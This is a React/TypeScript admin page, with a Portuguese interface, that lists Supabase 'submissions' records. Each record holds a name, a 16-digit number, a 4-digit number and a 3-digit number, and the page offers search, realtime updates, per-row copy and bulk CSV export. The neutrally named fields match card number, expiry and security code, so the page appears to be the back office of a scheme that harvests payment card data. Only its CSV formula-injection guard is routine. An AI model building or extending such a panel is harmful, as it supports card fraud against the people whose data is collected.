import { useEffect, useMemo, useState } from "react";
import { createPreviewSubmissions, neutralizeCsvValue, toCsvRow } from "../lib/csv";
import { getSupabase, isPreviewMode, type Submission } from "../lib/supabase";

const PAGE_SIZE = 10;

function formatDate(value: string) {
  return new Intl.DateTimeFormat("pt-BR", {
    dateStyle: "short",
    timeStyle: "short",
  }).format(new Date(value));
}

async function copyText(value: string) {
  await navigator.clipboard.writeText(value);
}

export default function SubmissionsPage() {
  const [items, setItems] = useState<Submission[]>([]);
  const [search, setSearch] = useState("");
  const [page, setPage] = useState(1);
  const [message, setMessage] = useState("");
  const [error, setError] = useState("");

  useEffect(() => {
    if (isPreviewMode()) {
      setItems(createPreviewSubmissions());
      return;
    }

    const supabase = getSupabase();
    if (!supabase) {
      setError("Supabase nao configurado.");
      return;
    }

    let active = true;

    async function load() {
      const { data, error: queryError } = await supabase!
        .from("submissions")
        .select("*")
        .order("created_at", { ascending: false });
      if (!active) return;
      if (queryError) {
        setError(queryError.message);
        return;
      }
      setItems((data as Submission[]) || []);
    }

    load();

    const channel = supabase
      .channel("submissions-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "submissions" }, () => {
        load();
      })
      .subscribe();

    return () => {
      active = false;
      supabase.removeChannel(channel);
    };
  }, []);

  const filtered = useMemo(() => {
    const term = search.trim().toLowerCase();
    if (!term) return items;
    return items.filter((item) =>
      [item.name, item.number16, item.number4, item.number3].some((value) => value.toLowerCase().includes(term)),
    );
  }, [items, search]);

  const totalPages = Math.max(1, Math.ceil(filtered.length / PAGE_SIZE));
  const currentPage = Math.min(page, totalPages);
  const pageItems = filtered.slice((currentPage - 1) * PAGE_SIZE, currentPage * PAGE_SIZE);

  async function removeItem(id: string) {
    if (isPreviewMode()) {
      setItems((current) => current.filter((item) => item.id !== id));
      setMessage("Registro removido do preview.");
      return;
    }

    const supabase = getSupabase();
    if (!supabase) return;
    const { error: deleteError } = await supabase.from("submissions").delete().eq("id", id);
    if (deleteError) {
      setError(deleteError.message);
      return;
    }
    setMessage("Registro excluido.");
  }

  function exportCsv() {
    const header = toCsvRow(["nome", "numero_16", "numero_4", "numero_3", "criado_em"]);
    const rows = filtered.map((item) =>
      toCsvRow([item.name, item.number16, item.number4, item.number3, item.created_at]),
    );
    const blob = new Blob([[header, ...rows].join("\n")], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `recebimentos-${new Date().toISOString().slice(0, 10)}.csv`;
    link.click();
    URL.revokeObjectURL(url);
    setMessage(`CSV exportado com ${filtered.length} registro(s).`);
  }

  return (
    <div className="stack">
      <div className="row" style={{ justifyContent: "space-between" }}>
        <div>
          <h1>Recebimentos</h1>
          <p className="muted">Novos envios aparecem automaticamente quando o Realtime esta ativo.</p>
        </div>
        <button className="btn secondary" type="button" onClick={exportCsv}>
          Exportar CSV
        </button>
      </div>

      <div className="card stack">
        <div className="field">
          <label htmlFor="search">Buscar</label>
          <input
            id="search"
            type="search"
            placeholder="Nome ou numeros"
            value={search}
            onChange={(event) => {
              setSearch(event.target.value);
              setPage(1);
            }}
          />
        </div>

        <div className="table-wrap">
          <table>
            <thead>
              <tr>
                <th>Nome</th>
                <th>16 digitos</th>
                <th>4 digitos</th>
                <th>3 digitos</th>
                <th>Criado em</th>
                <th>Acoes</th>
              </tr>
            </thead>
            <tbody>
              {pageItems.map((item) => (
                <tr key={item.id}>
                  <td>{item.name}</td>
                  <td className="mono">{item.number16}</td>
                  <td className="mono">{item.number4}</td>
                  <td className="mono">{item.number3}</td>
                  <td>{formatDate(item.created_at)}</td>
                  <td>
                    <div className="row">
                      <button
                        className="btn secondary"
                        type="button"
                        onClick={() =>
                          copyText(`${item.name}\t${item.number16}\t${item.number4}\t${item.number3}`).then(() =>
                            setMessage("Copiado."),
                          )
                        }
                      >
                        Copiar
                      </button>
                      <button className="btn danger" type="button" onClick={() => removeItem(item.id)}>
                        Excluir
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
              {!pageItems.length ? (
                <tr>
                  <td colSpan={6} className="muted">
                    Nenhum registro encontrado.
                  </td>
                </tr>
              ) : null}
            </tbody>
          </table>
        </div>

        <div className="row" style={{ justifyContent: "space-between" }}>
          <span className="muted">
            {filtered.length} registro(s) • pagina {currentPage} de {totalPages}
          </span>
          <div className="row">
            <button className="btn secondary" type="button" disabled={currentPage <= 1} onClick={() => setPage((value) => value - 1)}>
              Anterior
            </button>
            <button
              className="btn secondary"
              type="button"
              disabled={currentPage >= totalPages}
              onClick={() => setPage((value) => value + 1)}
            >
              Proxima
            </button>
          </div>
        </div>
      </div>

      {message ? <p className="success">{message}</p> : null}
      {error ? <p className="error">{error}</p> : null}
      <p className="muted">CSV neutraliza valores que comecam com =, +, - ou @.</p>
      <p className="muted">Exemplo seguro: {neutralizeCsvValue("=1+1")}</p>
    </div>
  );
}
